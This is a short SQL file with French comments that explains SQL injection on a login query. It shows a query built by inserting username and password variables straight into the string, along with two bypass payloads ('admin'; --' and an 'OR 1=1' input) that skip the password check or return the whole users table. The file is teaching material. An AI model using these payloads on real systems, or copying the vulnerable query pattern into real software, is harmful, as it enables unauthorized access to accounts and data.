-- Requete telle qu'elle apparait 
SELECT * FROM `users` WHERE `username` = '$username' AND `pass` = '$password';

-- Requete quand on remplace les variables par leurs valeurs respectives
SELECT * FROM `users` WHERE `username` = 'admin'; --' AND `pass` = '$password'

-- On voit que le fait d'écrire (admin'; --) à la place de ($username) les deux -- font passer le reste du texte de la requete en COMMENTAIRE
-- De ce fait, la requete devient :

SELECT * FROM `users` WHERE `username` = 'admin'; -- AND `pass` = '$password'

-- Du coup l'intégralité des informations de l'utilisateur 'admin' se voient affichées à l'écran !!

-- Autre type d'injection sql
-- Requete de base
SELECT * FROM `users` WHERE `username` = '$username' AND `pass` = '$password';

-- Requete après injection
SELECT * FROM `users` WHERE `username` = 'admin' AND `pass` = 'inconnu' OR 1=1; --';

-- C'est comme ci on écrivait
SELECT * FROM `users` WHERE 1=1;

-- Avec ce type injection, on peut récupérer du coup l'intégralité de la bdd